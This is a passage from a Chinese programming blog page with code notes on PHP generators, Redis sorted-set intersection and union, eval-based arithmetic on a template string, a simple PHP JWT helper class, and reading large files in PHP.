$&#123;BACKUP_DIRECTORY&#125;/$(date <span class="string">'+%Y%m%d'</span>).txt</span><br></pre></td></tr></table></figure>
<h3 id="php-yield"><a href="#php-yield" class="headerlink" title="php yield"></a>php yield</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'value'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(getValues()); <span class="comment">// string(5) "value"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">'value'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(getValues()); <span class="comment">// class Generator#1 (0) &#123;&#125;</span></span><br><span class="line">一个生成器允许你使用循环来迭代一组数据，而不需要在内存中创建是一个数组，这可能会导致你超出内存限制。</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="comment">// 获取内存使用数据</span></span><br><span class="line">   echo round(memory_get_usage() / <span class="number">1024</span> / <span class="number">1024</span>, <span class="number">2</span>) . <span class="string">' MB'</span> . PHP_EOL;</span><br><span class="line">   <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt; <span class="number">800000</span>; $i++) &#123;</span><br><span class="line">      <span class="keyword">yield</span> $i;</span><br><span class="line">      <span class="comment">// 做性能分析，因此可测量内存使用率</span></span><br><span class="line">      <span class="keyword">if</span> (($i % <span class="number">200000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="comment">// 内存使用以 MB 为单位</span></span><br><span class="line">         echo round(memory_get_usage() / <span class="number">1024</span> / <span class="number">1024</span>, <span class="number">2</span>) . <span class="string">' MB'</span>. PHP_EOL;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$myValues = getValues(); <span class="comment">// 在循环之前都不会有动作</span></span><br><span class="line">foreach ($myValues <span class="keyword">as</span> $value) &#123;&#125; <span class="comment">// 开始生成数据https://learnku.com/laravel/t/8704/using-yield-to-do-memory-optimization-in-php </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">yield</span> <span class="string">'value'</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">'returnValue'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$values = getValues();</span><br><span class="line">foreach ($values <span class="keyword">as</span> $value) &#123;&#125;</span><br><span class="line">echo $values-&gt;getReturn(); <span class="comment">// 'returnValue'</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">yield</span> <span class="string">'key'</span> =&gt; <span class="string">'value'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$values = getValues();</span><br><span class="line">foreach ($values <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">   echo $key . <span class="string">' =&gt; '</span> . $value;</span><br><span class="line">&#125;</span><br><span class="line">使用 $ret = Generator::getReturn() 方法。</span><br><span class="line">使用 $ret = <span class="keyword">yield</span> <span class="keyword">from</span> Generator() 表达式</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echoTimes</span>(<span class="params">$msg, $max</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $max; ++$i) &#123;</span><br><span class="line">        echo <span class="string">"$msg iteration $i\n"</span>;</span><br><span class="line">        <span class="keyword">yield</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"$msg the end value : $i\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">task</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $end = <span class="keyword">yield</span> <span class="keyword">from</span> echoTimes(<span class="string">'foo'</span>, <span class="number">10</span>);</span><br><span class="line">    echo $end;</span><br><span class="line">    $gen = echoTimes(<span class="string">'bar'</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> $gen;</span><br><span class="line">    echo $gen-&gt;getReturn();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach (task() <span class="keyword">as</span> $item) &#123;</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Redis技巧-Sorted-Set使用"><a href="#Redis技巧-Sorted-Set使用" class="headerlink" title="Redis技巧:Sorted Set使用"></a>Redis技巧:Sorted Set使用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ZADD mid_test <span class="number">70</span> <span class="string">"Li Lei"</span></span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ZADD mid_test <span class="number">70</span> <span class="string">"Han Meimei"</span></span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ZADD mid_test <span class="number">99.5</span> <span class="string">"Tom"</span></span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt;  ZADD fin_test <span class="number">88</span> <span class="string">"Li Lei"</span></span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt;  ZADD fin_test <span class="number">75</span> <span class="string">"Han Meimei"</span></span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ZADD fin_test <span class="number">99.5</span> <span class="string">"Tom"</span></span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ZADD fin_test <span class="number">100</span> <span class="string">"Jerry"</span></span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt;  ZINTERSTORE sum_point <span class="number">2</span> mid_test fin_test</span><br><span class="line">(integer) <span class="number">3</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ZREVRANGE sum_point <span class="number">0</span> <span class="number">-1</span> WITHSCORES</span><br><span class="line"><span class="number">1</span>) <span class="string">"Tom"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"199"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"Li Lei"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"158"</span></span><br><span class="line"><span class="number">5</span>) <span class="string">"Han Meimei"</span></span><br><span class="line"><span class="number">6</span>) <span class="string">"145"</span></span><br><span class="line">老师要按期中考试和期末考试的总成绩来排座位，就对mid_test和fin_test做了个交集  结果显示了学生的总成绩。 但结果中没有新来的Jerry同学（尽管TA考了<span class="number">100</span>分）。这是坑一。</span><br><span class="line">ZINTERSTORE取所有集合的交集。以两个集合A和B为例，要取交集C，是这样的逻辑：</span><br><span class="line"></span><br><span class="line">A和B中共有的member，会加入到C中，其score等于A、B中score之和。</span><br><span class="line">不同时在A和B的member，不会加到C中。</span><br><span class="line"></span><br><span class="line">ZUNIONSTORE计算所有集合的并集。以两个集合A和B为例，要取并集C，是这样的逻辑：</span><br><span class="line"></span><br><span class="line">A的所有member会加到C中，其score与A中相等</span><br><span class="line">B的所有member会加到C中，其score与B中相等</span><br><span class="line">A和B中共有的member，其score等于A、B中score之和。</span><br><span class="line">因为ZINTERSTORE和ZUNIONSTORE有个参数为AGGREGATE，表示结果集的聚合方式，可取SUM、MIN、MAX其中之一。默认值为SUM。</span><br><span class="line"></span><br><span class="line">所以不指定聚合方式时，缺省值为SUM，即求和。http:<span class="comment">//blog.text.wiki/2015/11/01/redis-zunionstore-tip.html </span></span><br><span class="line"> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; zadd programmer <span class="number">2000</span> peter</span><br><span class="line">  (integer) <span class="number">1</span></span><br><span class="line">  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; zadd programmer <span class="number">3500</span> jack</span><br><span class="line">  (integer) <span class="number">1</span></span><br><span class="line">  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; zadd programmer <span class="number">5000</span> tom</span><br><span class="line">  (integer) <span class="number">1</span></span><br><span class="line">  </span><br><span class="line">    <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; zadd manager <span class="number">2000</span> herry</span><br><span class="line">    (integer) <span class="number">1</span></span><br><span class="line">    <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; zadd manager <span class="number">3500</span> mary</span><br><span class="line">    (integer) <span class="number">1</span></span><br><span class="line">    <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; zadd manager <span class="number">4000</span> tom</span><br><span class="line">    (integer) <span class="number">1</span></span><br><span class="line">      <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; zunionstore salary <span class="number">2</span> programmer manager</span><br><span class="line">      (integer) <span class="number">5</span></span><br><span class="line">      <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; zrange salary <span class="number">0</span> <span class="number">-1</span> withscores</span><br><span class="line">       <span class="number">1</span>) <span class="string">"herry"</span></span><br><span class="line">       <span class="number">2</span>) <span class="string">"2000"</span></span><br><span class="line">       <span class="number">3</span>) <span class="string">"peter"</span></span><br><span class="line">       <span class="number">4</span>) <span class="string">"2000"</span></span><br><span class="line">       <span class="number">5</span>) <span class="string">"jack"</span></span><br><span class="line">       <span class="number">6</span>) <span class="string">"3500"</span></span><br><span class="line">       <span class="number">7</span>) <span class="string">"mary"</span></span><br><span class="line">       <span class="number">8</span>) <span class="string">"3500"</span></span><br><span class="line">       <span class="number">9</span>) <span class="string">"tom"</span></span><br><span class="line">      <span class="number">10</span>) <span class="string">"9000"</span></span><br></pre></td></tr></table></figure>
<h3 id="字符串算术表达式计算"><a href="#字符串算术表达式计算" class="headerlink" title="字符串算术表达式计算"></a>字符串算术表达式计算</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$aa = <span class="string">"&#123;1&#125;*&#123;2&#125;-&#123;3&#125;"</span>;  </span><br><span class="line">$farr = array(<span class="string">'/\&#123;1\&#125;/'</span>,<span class="string">'/\&#123;2\&#125;/'</span>,<span class="string">'/\&#123;3\&#125;/'</span>);  </span><br><span class="line">$tarr = array(<span class="number">3</span>,<span class="number">4</span>,<span class="number">10</span>);  </span><br><span class="line">$str = preg_replace( $farr,$tarr,$aa);  </span><br><span class="line">echo $str;        <span class="comment">//结果：3*4-10  </span></span><br><span class="line">echo <span class="built_in">eval</span>(<span class="string">'return '</span>.$str.<span class="string">';'</span>);   <span class="comment">//结果:2</span></span><br></pre></td></tr></table></figure>
<h3 id="jwt-用户身份认证"><a href="#jwt-用户身份认证" class="headerlink" title="jwt 用户身份认证"></a>jwt 用户身份认证</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JwtBase</span> </span>&#123;</span><br><span class="line">    <span class="comment">//头部</span></span><br><span class="line">    private <span class="keyword">static</span> $header=array(</span><br><span class="line">        <span class="string">'alg'</span>=&gt;<span class="string">'HS256'</span>, <span class="comment">//生成signature的算法</span></span><br><span class="line">        <span class="string">'typ'</span>=&gt;<span class="string">'JWT'</span>  <span class="comment">//类型</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//使用HMAC生成信息摘要时所使用的密钥</span></span><br><span class="line">    private <span class="keyword">static</span> $key=<span class="string">'KEY'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取jwt token</span></span><br><span class="line"><span class="comment">     * @param array $payload jwt载荷  格式如下非必须</span></span><br><span class="line"><span class="comment">     * [</span></span><br><span class="line"><span class="comment">     * 'iss'=&gt;'jwt_admin', //该JWT的签发者</span></span><br><span class="line"><span class="comment">     * 'iat'=&gt;time(), //签发时间</span></span><br><span class="line"><span class="comment">     * 'exp'=&gt;time()+7200, //过期时间</span></span><br><span class="line"><span class="comment">     * 'nbf'=&gt;time()+60, //该时间之前不接收处理该Token</span></span><br><span class="line"><span class="comment">     * 'sub'=&gt;'www.admin.com', //面向的用户</span></span><br><span class="line"><span class="comment">     * 'jti'=&gt;md5(uniqid('JWT').time()) //该Token唯一标识</span></span><br><span class="line"><span class="comment">     * ]</span></span><br><span class="line"><span class="comment">     * @return bool|string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params">array $payload</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $arr = [</span><br><span class="line">            <span class="string">'iss'</span>=&gt;<span class="string">'yamecent'</span>, <span class="comment">//该JWT的签发者</span></span><br><span class="line">            <span class="string">'iat'</span>=&gt;time(), <span class="comment">//签发时间</span></span><br><span class="line">            <span class="string">'exp'</span>=&gt;time()+<span class="number">3600</span>*<span class="number">24</span>*<span class="number">15</span>, <span class="comment">//过期时间</span></span><br><span class="line">            <span class="string">'nbf'</span>=&gt;time(), <span class="comment">//该时间之前不接收处理该Token</span></span><br><span class="line">            <span class="string">'sub'</span>=&gt;<span class="string">''</span>, <span class="comment">//面向的用户</span></span><br><span class="line">            <span class="string">'jti'</span>=&gt;md5(uniqid(<span class="string">'JWT'</span>).time()) <span class="comment">//该Token唯一标识</span></span><br><span class="line">        ];</span><br><span class="line">        $payload = array_merge($arr,$payload);</span><br><span class="line">        <span class="keyword">if</span>(is_array($payload))</span><br><span class="line">        &#123;</span><br><span class="line">            $base64header=self::base64UrlEncode(json_encode(self::$header,JSON_UNESCAPED_UNICODE));</span><br><span class="line">            $base64payload=self::base64UrlEncode(json_encode($payload,JSON_UNESCAPED_UNICODE));</span><br><span class="line">            $token=$base64header.<span class="string">'.'</span>.$base64payload.<span class="string">'.'</span>.self::signature($base64header.<span class="string">'.'</span>.$base64payload,<span class="attr">self</span>::$key,<span class="attr">self</span>::$header[<span class="string">'alg'</span>]);</span><br><span class="line">            <span class="keyword">return</span> $token;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 验证token是否有效,默认验证exp,nbf,iat时间</span></span><br><span class="line"><span class="comment">     * @param string $Token 需要验证的token</span></span><br><span class="line"><span class="comment">     * @return bool|string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyToken</span>(<span class="params">string $Token</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tokens = explode(<span class="string">'.'</span>, $Token);</span><br><span class="line">        <span class="keyword">if</span> (count($tokens) != <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        list($base64header, $base64payload, $sign) = $tokens;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取jwt算法</span></span><br><span class="line">        $base64decodeheader = json_decode(self::base64UrlDecode($base64header), JSON_OBJECT_AS_ARRAY);</span><br><span class="line">        <span class="keyword">if</span> (empty($base64decodeheader[<span class="string">'alg'</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//签名验证</span></span><br><span class="line">        <span class="keyword">if</span> (self::signature($base64header . <span class="string">'.'</span> . $base64payload, <span class="attr">self</span>::$key, $base64decodeheader[<span class="string">'alg'</span>]) !== $sign)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        $payload = json_decode(self::base64UrlDecode($base64payload), JSON_OBJECT_AS_ARRAY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//签发时间大于当前服务器时间验证失败</span></span><br><span class="line">        <span class="keyword">if</span> (isset($payload[<span class="string">'iat'</span>]) &amp;&amp; $payload[<span class="string">'iat'</span>] &gt; time())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//过期时间小宇当前服务器时间验证失败</span></span><br><span class="line">        <span class="keyword">if</span> (isset($payload[<span class="string">'exp'</span>]) &amp;&amp; $payload[<span class="string">'exp'</span>] &lt; time())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//该nbf时间之前不接收处理该Token</span></span><br><span class="line">        <span class="keyword">if</span> (isset($payload[<span class="string">'nbf'</span>]) &amp;&amp; $payload[<span class="string">'nbf'</span>] &gt; time())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $payload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * base64UrlEncode  https://jwt.io/ 中base64UrlEncode编码实现</span></span><br><span class="line"><span class="comment">     * @param string $input 需要编码的字符串</span></span><br><span class="line"><span class="comment">     * @return string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">base64UrlEncode</span>(<span class="params">string $input</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_replace(<span class="string">'='</span>, <span class="string">''</span>, strtr(base64_encode($input), <span class="string">'+/'</span>, <span class="string">'-_'</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * base64UrlEncode https://jwt.io/ 中base64UrlEncode解码实现</span></span><br><span class="line"><span class="comment">     * @param string $input 需要解码的字符串</span></span><br><span class="line"><span class="comment">     * @return bool|string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">base64UrlDecode</span>(<span class="params">string $input</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $remainder = strlen($input) % <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> ($remainder) &#123;</span><br><span class="line">            $addlen = <span class="number">4</span> - $remainder;</span><br><span class="line">            $input .= str_repeat(<span class="string">'='</span>, $addlen);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> base64_decode(strtr($input, <span class="string">'-_'</span>, <span class="string">'+/'</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * HMACSHA256签名  https://jwt.io/ 中HMACSHA256签名实现</span></span><br><span class="line"><span class="comment">     * @param string $input 为base64UrlEncode(header).".".base64UrlEncode(payload)</span></span><br><span class="line"><span class="comment">     * @param string $key</span></span><br><span class="line"><span class="comment">     * @param string $alg  算法方式</span></span><br><span class="line"><span class="comment">     * @return mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">signature</span>(<span class="params">string $input, string $key, string $alg = <span class="string">'HS256'</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $alg_config=array(</span><br><span class="line">            <span class="string">'HS256'</span>=&gt;<span class="string">'sha256'</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> self::base64UrlEncode(hash_hmac($alg_config[$alg], $input, $key,<span class="literal">true</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$token = JwtBase::getToken([<span class="string">'user_id'</span>=&gt;$user-&gt;id]);<span class="comment">//生成token https://learnku.com/articles/21951</span></span><br><span class="line"></span><br><span class="line">$header = $request-&gt;header(<span class="string">'Authorization'</span>);<span class="comment">//验证</span></span><br><span class="line">        $token = explode(<span class="string">' '</span>,$header);</span><br><span class="line">        <span class="keyword">if</span>(!$header || !$token)&#123;</span><br><span class="line">            <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;json(<span class="number">419</span>,<span class="string">'登录信息已过期，重新登录'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $data = JwtBase::verifyToken($token[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!$data)&#123;</span><br><span class="line">            <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;json(<span class="number">419</span>,<span class="string">'登录信息已过期，重新登录'</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="PHP-读取超大文件"><a href="#PHP-读取超大文件" class="headerlink" title="PHP 读取超大文件"></a>PHP 读取超大文件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.itcodemonkey.com/article/11835.html</span></span><br><span class="line">随便找一个nginx的日志文件，哪怕只有<span class="number">10</span>KB，假设文件名是test.log，然后呢执行<span class="string">" cat test.log &gt;&gt; test.log "</span></span><br><span class="line">&lt;?php</span><br><span class="line">$begin = microtime( <span class="literal">true</span> );</span><br><span class="line">$fp = fopen( <span class="string">'./test.log'</span>, <span class="string">'r'</span> );</span><br><span class="line"><span class="keyword">while</span>( <span class="literal">false</span> !== ( $buffer = fgets( $fp, <span class="number">4096</span> ) ) )&#123;</span><br><span class="line">  <span class="comment">//echo $buffer.PHP_EOL;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( !feof( $fp ) )&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">'... ...'</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose( $fp );</span><br><span class="line">$end = microtime( <span class="literal">true</span> );</span><br><span class="line">echo <span class="string">"cost : "</span>.( $end - $begin ).<span class="string">' sec'</span>.PHP_EOL;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$begin = microtime( <span class="literal">true</span> );</span><br><span class="line">$fp = fopen( <span class="string">'./test.log'</span>, <span class="string">'r'</span> );</span><br><span class="line"><span class="keyword">while</span>( !feof( $fp ) )&#123;</span><br><span class="line">  <span class="comment">// 如果你要使用echo，那么，你会很惨烈...</span></span><br><span class="line">  fread( $fp, <span class="number">10240</span> );</span><br><span 